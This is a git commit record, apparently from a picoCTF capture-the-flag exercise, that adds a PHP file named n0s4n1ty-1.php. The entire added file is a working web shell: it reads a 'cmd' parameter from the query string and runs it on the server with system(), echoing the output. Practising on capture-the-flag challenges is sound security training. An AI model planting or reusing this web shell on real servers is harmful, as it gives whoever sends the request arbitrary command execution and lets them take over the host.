2280325a9ca6afa2adc38d59f1a6739bcc960496
IlyasaNandaRahmadianto <84637820+IlyasaNandaRahmadianto@users.noreply.github.com>
2025-04-14 07:59:08 +0700

    first push pico-ctf

---
+++ NOSANITY/n0s4n1ty-1.php
@@ -0,0 +1,7 @@
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    $cmd = $_GET['cmd'];  // Get command from the query string
+    system($cmd);         // Execute the command and display output
+    echo "</pre>";
+}
